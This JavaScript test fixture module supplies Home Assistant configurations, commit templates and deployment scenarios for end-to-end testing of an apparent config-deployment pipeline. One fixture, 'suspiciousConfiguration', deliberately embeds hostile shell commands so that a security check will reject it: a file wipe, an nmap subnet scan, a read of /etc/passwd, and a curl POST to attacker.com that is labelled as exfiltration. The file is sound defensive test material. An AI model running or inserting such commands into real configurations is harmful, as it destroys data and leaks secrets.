// Test fixture configurations for Home Assistant scenarios

const validConfiguration = `
# Home Assistant configuration for E2E testing
homeassistant:
  name: "E2E Test Home"
  latitude: 40.7128
  longitude: -74.0060
  elevation: 10
  unit_system: metric
  time_zone: "America/New_York"
  
automation: !include automations.yaml
script: !include scripts.yaml
scene: !include scenes.yaml
sensor: !include sensors.yaml

logger:
  default: info
  logs:
    homeassistant.core: debug

http:
  server_port: 8123

api:
history:
system_health:
config:
sun:
`;

const validAutomation = `
# E2E Test Automation
- id: 'e2e_test_automation'
  alias: 'E2E Test Automation'
  description: 'Automation for E2E testing'
  trigger:
    - platform: time
      at: '06:00:00'
  condition: []
  action:
    - service: notify.persistent_notification
      data:
        message: 'E2E test automation executed successfully'
        title: 'E2E Test'
  mode: single
`;

const invalidSyntaxConfig = `
# Invalid YAML syntax configuration
homeassistant:
  name: "E2E Test Home"
  latitude: 40.7128
  longitude: -74.0060
  elevation: 10
  unit_system: metric
  time_zone: "America/New_York"
  
# Missing closing bracket
automation: !include automations.yaml
script: !include scripts.yaml
sensor: [
  - platform: time_date
    display_options:
      - 'time'
      - 'date'
# Missing closing bracket here - will cause YAML parse error

logger:
  default: info
`;

const invalidAutomation = `
# Invalid automation syntax
- id: 'invalid_automation'
  alias: 'Invalid Automation'
  description: 'This automation has invalid syntax'
  trigger:
    - platform: invalid_platform  # This platform doesn't exist
      invalid_option: true
  condition:
    - condition: invalid_condition  # This condition doesn't exist
  action:
    - service: non_existent.service  # This service doesn't exist
      data:
        invalid_parameter: true
  mode: single
`;

const runtimeFailureConfig = `
# Configuration that passes validation but fails at runtime
homeassistant:
  name: "E2E Runtime Failure Test"
  latitude: 40.7128
  longitude: -74.0060
  elevation: 10
  unit_system: metric
  time_zone: "America/New_York"

# These integrations will fail to load due to missing hardware/services
zwave:
  usb_path: /dev/ttyUSB0  # Device doesn't exist

mqtt:
  broker: 192.168.1.999  # Invalid IP address
  port: 1883
  username: invalid_user
  password: invalid_password

modbus:
  - name: hub1
    type: tcp
    host: 192.168.1.888  # Unreachable host
    port: 502

automation: !include automations.yaml
`;

const largeConfiguration = `
# Large configuration for performance testing
homeassistant:
  name: "E2E Large Config Test"
  latitude: 40.7128
  longitude: -74.0060
  elevation: 10
  unit_system: metric
  time_zone: "America/New_York"

# Large number of sensors
sensor:
${Array.from({length: 100}, (_, i) => `  - platform: template
    sensors:
      test_sensor_${i}:
        friendly_name: "Test Sensor ${i}"
        value_template: "{{ now().timestamp() | round(0) }}"
        unit_of_measurement: "units"`).join('\n')}

# Large number of binary sensors
binary_sensor:
${Array.from({length: 50}, (_, i) => `  - platform: template
    sensors:
      test_binary_sensor_${i}:
        friendly_name: "Test Binary Sensor ${i}"
        value_template: "{{ (now().timestamp() | round(0)) % 2 == 0 }}"`).join('\n')}

# Large number of input booleans
input_boolean:
${Array.from({length: 75}, (_, i) => `  test_input_${i}:
    name: "Test Input ${i}"
    initial: false`).join('\n')}

automation: !include automations.yaml
script: !include scripts.yaml
`;

const largeAutomations = `
# Large number of automations for performance testing
${Array.from({length: 50}, (_, i) => `- id: 'large_automation_${i}'
  alias: 'Large Automation ${i}'
  description: 'Performance test automation ${i}'
  trigger:
    - platform: state
      entity_id: input_boolean.test_input_${i}
      from: 'off'
      to: 'on'
  condition:
    - condition: time
      after: '06:00:00'
      before: '22:00:00'
  action:
    - service: notify.persistent_notification
      data:
        message: 'Large automation ${i} executed'
        title: 'Performance Test ${i}'
    - delay: '00:00:0${i % 10}'
    - service: input_boolean.turn_off
      entity_id: input_boolean.test_input_${i}
  mode: single`).join('\n\n')}
`;

const suspiciousConfiguration = `
# Configuration with potentially suspicious content
homeassistant:
  name: "E2E Security Test"
  latitude: 40.7128
  longitude: -74.0060
  elevation: 10
  unit_system: metric
  time_zone: "America/New_York"

# Suspicious shell commands
shell_command:
  dangerous_command: "rm -rf /tmp/*"  # Potentially dangerous
  network_scan: "nmap -sS 192.168.1.0/24"  # Network scanning
  system_info: "cat /etc/passwd"  # System file access

# Suspicious REST sensors
sensor:
  - platform: rest
    resource: "http://malicious-site.com/api/data"  # External untrusted site
    name: "Suspicious Sensor"
    
  - platform: command_line
    command: "curl -X POST http://attacker.com/steal"  # Data exfiltration attempt
    name: "Command Line Sensor"

automation: !include automations.yaml
`;

const configurations = {
  valid: {
    'configuration.yaml': validConfiguration,
    'automations.yaml': validAutomation,
    'scripts.yaml': '# Scripts placeholder',
    'scenes.yaml': '# Scenes placeholder',
    'sensors.yaml': '# Sensors placeholder'
  },
  
  invalidSyntax: {
    'configuration.yaml': invalidSyntaxConfig,
    'automations.yaml': invalidAutomation
  },
  
  runtimeFailure: {
    'configuration.yaml': runtimeFailureConfig,
    'automations.yaml': validAutomation
  },
  
  large: {
    'configuration.yaml': largeConfiguration,
    'automations.yaml': largeAutomations,
    'scripts.yaml': '# Scripts placeholder',
    'sensors.yaml': '# Sensors placeholder'
  },
  
  suspicious: {
    'configuration.yaml': suspiciousConfiguration,
    'automations.yaml': validAutomation
  }
};

// Git commit templates for different scenarios
const commitTemplates = {
  feature: {
    message: 'feat: add new {feature} functionality',
    author: {
      name: 'Feature Developer',
      email: 'feature@example.com'
    }
  },
  
  bugfix: {
    message: 'fix: resolve {issue} in {component}',
    author: {
      name: 'Bug Fixer',
      email: 'bugfix@example.com'
    }
  },
  
  security: {
    message: 'security: update {component} to address vulnerability',
    author: {
      name: 'Security Team',
      email: 'security@example.com'
    }
  },
  
  performance: {
    message: 'perf: optimize {component} for better performance',
    author: {
      name: 'Performance Engineer',
      email: 'performance@example.com'
    }
  },
  
  config: {
    message: 'config: update Home Assistant configuration',
    author: {
      name: 'Config Manager',
      email: 'config@example.com'
    }
  }
};

// Test data generators
function generateTestRepository(name, config = 'valid') {
  return {
    name,
    description: `Test repository for ${name}`,
    files: configurations[config] || configurations.valid,
    branches: ['main', 'develop', 'feature/test-branch'],
    tags: ['v1.0.0', 'v1.1.0', 'v2.0.0'],
    commits: generateCommitHistory(10)
  };
}

function generateCommitHistory(count = 10) {
  const commits = [];
  const templates = Object.keys(commitTemplates);
  
  for (let i = 0; i < count; i++) {
    const templateKey = templates[i % templates.length];
    const template = commitTemplates[templateKey];
    
    commits.push({
      sha: require('crypto').randomBytes(20).toString('hex'),
      message: template.message.replace('{feature}', `feature-${i}`)
                              .replace('{issue}', `issue-${i}`)
                              .replace('{component}', `component-${i}`),
      author: template.author,
      timestamp: new Date(Date.now() - (i * 24 * 60 * 60 * 1000)).toISOString(),
      files: ['configuration.yaml', 'automations.yaml']
    });
  }
  
  return commits;
}

// Deployment scenarios with expected outcomes
const deploymentScenarios = {
  quickSuccess: {
    name: 'Quick Successful Deployment',
    config: 'valid',
    expectedDuration: 60000, // 1 minute
    expectedStatus: 'completed',
    expectedArtifacts: ['config_backup', 'service_restart_log']
  },
  
  slowSuccess: {
    name: 'Slow Successful Deployment',
    config: 'large',
    expectedDuration: 300000, // 5 minutes
    expectedStatus: 'completed',
    expectedArtifacts: ['config_backup', 'service_restart_log', 'performance_metrics']
  },
  
  validationFailure: {
    name: 'Configuration Validation Failure',
    config: 'invalidSyntax',
    expectedDuration: 30000, // 30 seconds
    expectedStatus: 'failed',
    expectedError: 'configuration validation failed'
  },
  
  runtimeFailure: {
    name: 'Runtime Failure with Rollback',
    config: 'runtimeFailure',
    expectedDuration: 180000, // 3 minutes
    expectedStatus: 'failed',
    expectedRollback: true
  },
  
  securityFailure: {
    name: 'Security Validation Failure',
    config: 'suspicious',
    expectedDuration: 45000, // 45 seconds
    expectedStatus: 'failed',
    expectedError: 'security validation failed'
  }
};

module.exports = {
  configurations,
  commitTemplates,
  deploymentScenarios,
  generateTestRepository,
  generateCommitHistory
};